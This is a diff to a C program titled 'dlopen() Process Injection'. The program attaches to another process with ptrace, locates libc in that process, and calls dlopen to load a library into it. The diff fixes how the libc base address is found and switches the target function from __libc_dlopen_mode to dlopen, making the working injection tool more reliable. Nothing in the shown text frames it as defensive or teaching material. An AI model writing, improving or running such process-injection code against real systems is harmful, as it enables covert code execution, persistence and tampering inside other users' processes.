@@ -1,3 +1,5 @@
+#define _GNU_SOURCE
+
 /*
  * dlopen() Process Injection
  *
@@ -19,8 +21,7 @@
 #include <dlfcn.h>
 #include <link.h>
 #include <elf.h>
-
-#define RTLD_NOW 2  /* Immediate function binding */
+#include <limits.h>
 
 /*
  * Find the address of a function in the target process
@@ -42,10 +43,11 @@ unsigned long find_libc_function(pid_t pid, const char *func_name) {
     /* Find libc base address */
     while (fgets(line, sizeof(line), maps)) {
         if (strstr(line, "libc-") || strstr(line, "libc.so")) {
-            unsigned long start;
+            unsigned long start, end, offset;
             char perms[5];
-            if (sscanf(line, "%lx-%*lx %4s", &start, perms) == 2) {
-                if (perms[0] == 'r' && perms[2] == 'x') {
+            if (sscanf(line, "%lx-%lx %4s %lx", &start, &end, perms,
+                       &offset) == 4) {
+                if (offset == 0) {
                     libc_base = start;
                     printf("[+] Found libc base: 0x%lx\n", libc_base);
                     break;
@@ -191,7 +193,7 @@ int inject_library(pid_t pid, const char *library_path) {
     printf("[+] Original RIP: 0x%llx\n", saved_regs.rip);
 
     /* Find dlopen address */
-    dlopen_addr = find_libc_function(pid, "__libc_dlopen_mode");
+    dlopen_addr = find_libc_function(pid, "dlopen");
     if (!dlopen_addr) {
         ptrace(PTRACE_DETACH, pid, NULL, NULL);
         return -1;
